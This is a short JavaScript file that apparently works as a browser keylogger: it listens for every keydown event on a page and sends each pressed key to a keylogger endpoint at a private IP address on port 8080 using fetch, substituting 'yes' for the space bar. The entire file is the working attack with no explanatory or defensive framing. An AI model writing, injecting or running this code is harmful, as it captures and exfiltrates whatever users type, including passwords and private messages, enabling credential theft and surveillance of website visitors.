function logkey(event){
    var test = event.key
    if (event.keyCode == 32){
       console.log("Yes");
       var test = "yes"
    }
    fetch("http://10.0.0.238:8080/keylogger?key="+test)
}
document.addEventListener('keydown', logkey)